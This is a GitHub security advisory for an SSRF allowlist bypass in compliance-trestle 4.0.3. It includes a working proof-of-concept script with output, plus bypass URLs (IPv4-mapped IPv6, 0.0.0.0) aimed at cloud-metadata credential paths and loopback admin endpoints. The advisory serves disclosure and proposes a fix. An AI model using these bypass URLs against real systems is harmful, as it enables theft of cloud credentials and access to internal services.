# [H] compliance-trestle has an URLSecurityValidator SSRF allowlist bypass via IPv4-mapped IPv6 and 0.0.0.0

## Summary
Severity: High
Advisory: GHSA-h47f-gmjp-m7rr
CVE: CVE-2026-52776
CWE: CWE-184, CWE-918
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-12
Source: https://github.com/advisories/GHSA-h47f-gmjp-m7rr
Type: github-advisory

## Affected
- PyPI: `compliance-trestle` — affected >=0 <4.1.0

## Details
### Summary

`compliance-trestle` 4.0.3 (latest) ships an `URLSecurityValidator` in `trestle/core/remote/security.py` to block SSRF to loopback / link-local / cloud-metadata endpoints from the HTTPSFetcher and SFTPFetcher remote-fetch paths. The allowlist is incomplete and can be bypassed by four equivalent address representations that resolve to the same blocked host but evade the validator's checks:

- IPv4-mapped IPv6 literals (`[::ffff:169.254.169.254]`, `[::ffff:127.0.0.1]`, `[::ffff:10.0.0.1]`) are returned by `socket.getaddrinfo` as `IPv6Address` objects; `IPv6Address in IPv4Network('169.254.0.0/16')` returns `False`, so the `_check_blocked_networks` and `_check_private_networks` predicates do not match.
- IPv4 unspecified address `0.0.0.0` is not in `ALWAYS_BLOCKED_NETWORKS` (which covers `127.0.0.0/8` but not `0.0.0.0/8`); on Linux + Docker, `0.0.0.0` routes to local services on any interface, and on dual-stack-mapped sockets it also reaches loopback listeners.

A malicious OSCAL profile referencing one of these URLs in `imports[*].href` or `back-matter.resources[*].rlinks[*].href` causes `HTTPSFetcher.__init__` and `_do_fetch` (which both invoke `validator.validate_url`) to pass the URL through to `requests.get`, contacting cloud-metadata services, loopback admin interfaces, or RFC 1918 internal networks (with `TRESTLE_BLOCK_PRIVATE_IPS=true` set) that the validator was specifically designed to block.

### Affected versions

`compliance-trestle` (PyPI) versions `<= 4.0.3` are affected. 4.0.3 (released 2026-05-20) is the latest release and the one that introduced `URLSecurityValidator`; prior releases had no SSRF guard at all.

### Privilege required

Network-position attacker who can supply or influence an OSCAL artifact (profile / catalog / SSP / component-definition) that compliance-trestle subsequently fetches via `HTTPSFetcher` or `SFTPFetcher`. The most realistic vector is a malicious OSCAL profile whose `imports[*].href` references one of the bypass URLs; the artifact then flows through `trestle href add` / `trestle import` / `trestle assemble` / `trestle author` / any workflow that resolves the profile's imports.

### Root cause

`trestle/core/remote/security.py` (4.0.3, lines 56-71 + 156-167):

```python
ALWAYS_BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),     # IPv4 loopback only
    ipaddress.ip_network('::1/128'),         # IPv6 loopback (single address)
    ipaddress.ip_network('169.254.0.0/16'),  # IPv4 link-local only
    ipaddress.ip_network('fe80::/10'),       # IPv6 link-local
]

METADATA_HOSTNAMES = {
    '169.254.169.254',          # IPv4 literal only
    'metadata.google.internal',
    'metadata.azure.com',
    '100.100.100.200',
}

def _check_blocked_networks(self, ip_addr, hostname):
    for network in ALWAYS_BLOCKED_NETWORKS:
        if ip_addr in network:  # IPv6Address in IPv4Network -> False
            raise TrestleError(...)
```

Four independent gaps:

1. **No IPv4-mapped IPv6 normalization.** `socket.getaddrinfo('::ffff:169.254.169.254', None)` returns an `IPv6Address`. Python's `ipaddress` module raises `TypeError` if mixed types are compared, and the `in` operator suppresses that to `False`. The validator never calls `.ipv4_mapped` to canonicalize before the membership check, so any always-blocked IPv4 range is bypassable via the `[::ffff:N.N.N.N]` literal.

2. **`METADATA_HOSTNAMES` is an exact-string set.** The hostname for `https://[::ffff:169.254.169.254]/` is `::ffff:169.254.169.254`, which is not in the set.

3. **`0.0.0.0` is not blocked.** `0.0.0.0` is not in any of the four `ALWAYS_BLOCKED_NETWORKS` ranges. On Linux and inside containers, connecting to `0.0.0.0` routes to local services on any interface (a common SSRF technique against Docker / orchestrator agents on `0.0.0.0:PORT`).

4. **DNS rebinding ribbon is only one IP deep.** `_resolve_hostname` records the first `getaddrinfo` result set, but a hostname with mixed records can still serve a private IP on the second resolution `validator.validate_url(self._url)` performs in `_do_fetch`. The IPv4-mapped-IPv6 bypass already eliminates the need for rebinding.

Sibling code paths sharing the same defect: `SFTPFetcher.__init__` (lines 359-365 of `cache.py`) wires the identical `URLSecurityValidator` and inherits all four gaps.

### Reproduction (E2E against `pip install compliance-trestle==4.0.3` + local IMDS simulator)

```bash
# 1. Setup
mkdir -p /tmp/poc-trestle && cd /tmp/poc-trestle
python3.12 -m venv venv   # any supported runtime (requires-python >= 3.10); 3.12.13 chosen because >= 3.12.4 it carries CPython CVE-2024-4032's is_global fix, proving this bypass is is_global-INDEPENDENT
./venv/bin/pip install --quiet compliance-trestle==4.0.3
./venv/bin/pip show compliance-trestle | head -2
# Name: compliance-trestle
# Version: 4.0.3

# 2. Driver
cat > e2e_full.py <<'PY'
import http.server, http.client, socket, socketserver, threading, time, os
from urllib.parse import urlparse
from trestle.core.remote.security import URLSecurityValidator, get_block_private_ips_config
from trestle.common.err import TrestleError

class IMDS(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = b'{"Code":"Success","AccessKeyId":"AKIA_PWNED_VIA_TRESTLE_SSRF","SecretAccessKey":"REDACTED","Token":"FAKE_IMDS_RESPONSE"}'
        self.send_response(200); self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)
    def log_message(self, *a, **kw): pass

class DualStack(socketserver.ThreadingMixIn, http.server.HTTPServer):
    address_family = socket.AF_INET6
    def server_bind(self):
        try: self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        except (AttributeError, OSError): pass
        super().server_bind()

PORT = 18560
srv = DualStack(("::", PORT), IMDS)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.2)

validator = URLSecurityValidator(block_private_ips=True)
def attempt(label, url, expect_block):
    try:
        validator.validate_url(url); verdict, blocked = "VALIDATION PASSED", False
    except TrestleError as e:
        verdict, blocked = f"BLOCKED: {str(e)[:80]}", True
    meta = "(expected)" if blocked == expect_block else "(*** UNEXPECTED ***)"
    print(f"\n[{label}]\n  URL: {url}\n  Validator: {verdict}  {meta}")
    if not blocked:
        try:
            p = urlparse(url); c = http.client.HTTPConnection(p.hostname, p.port or 443, timeout=3)
            c.request("GET", p.path or "/"); r = c.getresponse(); print(f"  Connectivity: HTTP {r.status}, body[:60]={r.read()[:60]!r}"); c.close()
        except Exception as e:
            print(f"  Connectivity: {type(e).__name__}: {str(e)[:80]}")

# Negative controls (validator must block)
attempt("NEG-1: literal 169.254.169.254", f"https://169.254.169.254:{PORT}/latest/meta-data/", True)
attempt("NEG-2: literal 127.0.0.1", f"https://127.0.0.1:{PORT}/admin", True)
attempt("NEG-3: metadata.google.internal", f"https://metadata.google.internal:{PORT}/", True)
attempt("NEG-4: literal 10.0.0.1 RFC1918", f"https://10.0.0.1:{PORT}/admin", True)
# Bypasses (validator should block, but does not)
attempt("BYPASS-1: IPv4-mapped IPv6 cloud-metadata", f"https://[::ffff:169.254.169.254]:{PORT}/latest/meta-data/iam/security-credentials/admin", True)
attempt("BYPASS-2: 0.0.0.0 reaches localhost", f"https://0.0.0.0:{PORT}/admin", True)
attempt("BYPASS-3: IPv4-mapped IPv6 loopback", f"https://[::ffff:127.0.0.1]:{PORT}/admin", True)
attempt("BYPASS-4: IPv4-mapped IPv6 RFC 1918", f"https://[::ffff:10.0.0.1]:{PORT}/admin", True)
srv.shutdown()
PY

# 3. Run
./venv/bin/python e2e_full.py
```

Observed output on a supported runtime, Python 3.12.13 / macOS Darwin 25.3.0 (verbatim). Note 3.12.13 is >= 3.12.4, so CPython CVE-2024-4032's `is_global`/`is_private` reclassification IS active here; the bypass nevertheless works because this validator uses `IPv6Address in IPv4Network(...)` membership (which silently returns False for cross-version comparison), NOT the `is_global` predicate. The mechanism is therefore robust to CPython version:

```
Python: 3.12.13
compliance-trestle: 4.0.3
  ::ffff:169.254.169.254       is_global=False  is_private=True  in IPv4Network('169.254.0.0/16')=False
  ::ffff:127.0.0.1             is_global=False  is_private=True  in IPv4Network('169.254.0.0/16')=False
  ::ffff:10.0.0.1              is_global=False  is_private=True  in IPv4Network('169.254.0.0/16')=False

[NEG-1: literal 169.254.169.254]
  URL: https://169.254.169.254:18560/latest/meta-data/
  Validator: BLOCKED: Access to cloud metadata endpoints is not allowed: 169.254.169.254. This is a se  (expected)

[NEG-2: literal 127.0.0.1]
  URL: https://127.0.0.1:18560/admin
  Validator: BLOCKED: Access to 127.0.0.0/8 addresses is blocked: 127.0.0.1 resolves to 127.0.0.1. Thi  (expected)

[NEG-3: metadata.google.internal]
  URL: https://metadata.google.internal:18560/
  Validator: BLOCKED: Access to cloud metadata endpoints is not allowed: metadata.google.internal. Thi  (expected)

[NEG-4: literal 10.0.0.1 RFC1918]
  URL: https://10.0.0.1:18560/admin
  Validator: BLOCKED: Access to private IP addresses is blocked: 10.0.0.1 resolves to 10.0.0.1 which i  (expected)

[BYPASS-1: IPv4-mapped IPv6 cloud-metadata]
  URL: https://[::ffff:169.254.169.254]:18560/latest/meta-data/iam/security-credentials/admin
  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)
  Connectivity: TimeoutError: timed out

[BYPASS-2: 0.0.0.0 reaches localhost]
  URL: https://0.0.0.0:18560/admin
  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)
  Connectivity: HTTP 200, body[:60]=b'{"Code":"Success","AccessKeyId":"AKIA_PWNED_VIA_TRESTLE_SSRF'

[BYPASS-3: IPv4-mapped IPv6 loopback]
  URL: https://[::ffff:127.0.0.1]:18560/admin
  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)
  Connectivity: HTTP 200, body[:60]=b'{"Code":"Success","AccessKeyId":"AKIA_PWNED_VIA_TRESTLE_SSRF'

[BYPASS-4: IPv4-mapped IPv6 RFC 1918]
  URL: https://[::ffff:10.0.0.1]:18560/admin
  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)
  Connectivity: RemoteDisconnected: Remote end closed connection without response
```

(The bracketed-IPv6 diagnostic lines above are the load-bearing proof of `is_global`-independence: even with CPython's CVE-2024-4032 fix active (`is_global=False`, `is_private=True`), the validator's `in IPv4Network(...)` membership check still returns `False`, so the bypass is not contingent on running an older Python. BYPASS-1/BYPASS-4 show the guard passing the URL; their connectivity lines time out only because the local sentinel listens on loopback/`::`, not on those literal addresses -- the security-relevant result is the validator passing, which on a real dual-stack host routes to the embedded IPv4 endpoint.)

Negative controls confirm the validator works as designed for the canonical literal forms it was written to block. All four bypass URLs pass `URLSecurityValidator.validate_url()` on the latest patched release.

### Impact

- SSRF to AWS / Azure / GCP / Alibaba IMDS via `https://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/<role>` -> short-lived role credentials exfiltrated through the cached fetch.
- SSRF to loopback administrative interfaces via `https://0.0.0.0:PORT/` or `https://[::ffff:127.0.0.1]:PORT/` -> access to local-only admin endpoints (Docker socket on `unix://`, Prometheus, etcd, Kubelet) that the validator was supposed to deny.
- SSRF to RFC 1918 internal services via `https://[::ffff:10.0.0.1]/...` even when `TRESTLE_BLOCK_PRIVATE_IPS=true` is explicitly set, defeating the operator's defense-in-depth posture.
- The cache-write traversal protection (`PathSecurityValidator.validate_url_path_for_cache` + `validate_cache_path`) is orthogonal and remains effective; this advisory is scoped to the SSRF allowlist gap only.

### Suggested fix

Normalize every resolved IP to its canonical IPv4 form before membership checks, and add `0.0.0.0` to the always-blocked set. Diff sketch against `trestle/core/remote/security.py`:

```python
ALWAYS_BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('fe80::/10'),
    ipaddress.ip_network('0.0.0.0/8'),     # IPv4 "this network", reaches localhost on Linux
    ipaddress.ip_network('::/128'),        # IPv6 unspecified
]

def _canonicalize_ip(self, ip_addr):
    """Map IPv4-mapped IPv6 addresses (::ffff:a.b.c.d) to their IPv4 form."""
    if isinstance(ip_addr, ipaddress.IPv6Address) and ip_addr.ipv4_mapped is not None:
        return ip_addr.ipv4_mapped
    return ip_addr

def _check_blocked_networks(self, ip_addr, hostname):
    ip_addr = self._canonicalize_ip(ip_addr)
    for network in ALWAYS_BLOCKED_NETWORKS:
        if ip_addr.version == network.version and ip_addr in network:
            raise TrestleError(...)

def _check_private_networks(self, ip_addr, hostname):
    ip_addr = self._canonicalize_ip(ip_addr)
    # ... same canonicalization before block_private_ip / warn_private_ip
```

Also add the canonicalized literal to `_check_metadata_endpoints`:

```python
def _check_metadata_endpoints(self, hostname):
    # Canonicalize bracketed IPv6 literal hostnames before exact-match
    canonical = hostname.strip('[]')
    try:
        canonical_ip = ipaddress.ip_address(canonical)
        if isinstance(canonical_ip, ipaddress.IPv6Address) and canonical_ip.ipv4_mapped:
            canonical = str(canonical_ip.ipv4_mapped)
    except ValueError:
        pass
    if canonical in METADATA_HOSTNAMES:
        raise TrestleError(...)
```

This mirrors the canonicalization pattern that pyca/cryptography, rustls-webpki, and the recent Node `undici` SSRF patches converged on after similar IPv6-mapped bypasses surfaced in 2024-2025.

### Credit

Reported by tonghuaroot.

## References
- https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-h47f-gmjp-m7rr
- https://github.com/oscal-compass/compliance-trestle/commit/d107cd16efe8eb15d46be3c1d97f1ec73d32447c
- https://github.com/oscal-compass/compliance-trestle
